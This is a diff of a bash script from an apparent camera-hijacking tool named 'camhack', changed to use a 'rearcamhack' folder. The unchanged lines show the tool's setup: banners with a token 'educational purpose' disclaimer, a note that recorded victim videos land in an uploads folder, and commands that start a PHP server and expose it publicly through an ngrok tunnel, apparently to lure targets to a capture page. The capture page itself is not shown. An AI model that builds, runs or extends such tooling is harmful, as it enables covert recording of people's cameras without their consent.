@@ -21,9 +21,9 @@ printf "\e[1;92m This tool is only for educational purpose\e[0m\n"
 printf "\n"
 printf "\e[1;92m Dont't use this tool for illegal activities\e[0m\n"
 printf "\n"
-printf "\e[1;92m recorded video are available in /sdcard/camhack/uploads folder\e[0m\n"
+printf "\e[1;92m recorded video are available in /sdcard/rearcamhack/uploads folder\e[0m\n"
 printf "\n"
-printf "\e[1;92m Don't delete camhack folder in your sdcard\e[0m\n"
+printf "\e[1;92m Don't delete rearcamhack folder in your sdcard\e[0m\n"
 printf "\n"
 printf "\n"
 printf "\e[1;92m Besure turn on your hotspot before start the tool otherwise doesn't work \e[0m\n"
@@ -67,7 +67,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 -t /sdcard/camhack > /dev/null 2>&1 & 
+php -S 127.0.0.1:3333 -t /sdcard/rearcamhack > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
